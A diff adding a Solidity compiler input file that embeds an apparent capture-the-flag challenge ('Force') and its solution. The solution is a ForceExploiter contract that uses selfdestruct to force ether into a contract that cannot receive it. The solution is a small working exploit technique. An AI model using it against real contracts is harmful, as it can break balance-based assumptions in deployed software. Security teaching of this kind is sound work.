@@ -1,0 +1,35 @@
+{
+  "language": "Solidity",
+  "sources": {
+    "contracts/Force.sol": {
+      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n// Challenge - add some eth to this contract\ncontract Force {\n    /*\n\n                   MEOW ?\n         /\\_/\\   /\n    ____/ o o \\\n  /~____  =ø= /\n (______)__m_m)\n\n*/\n}\n\ncontract ForceExploiter {\n    constructor() payable {}\n\n    // force send funds into the attack\n    function attack(address receiver) external {\n        address payable rec = payable(receiver);\n\n        selfdestruct(rec);\n    }\n}\n"
+    }
+  },
+  "settings": {
+    "optimizer": {
+      "enabled": false,
+      "runs": 200
+    },
+    "outputSelection": {
+      "*": {
+        "*": [
+          "abi",
+          "evm.bytecode",
+          "evm.deployedBytecode",
+          "evm.methodIdentifiers",
+          "metadata",
+          "devdoc",
+          "userdoc",
+          "storageLayout",
+          "evm.gasEstimates"
+        ],
+        "": [
+          "ast"
+        ]
+      }
+    },
+    "metadata": {
+      "useLiteralContent": true
+    }
+  }
+}
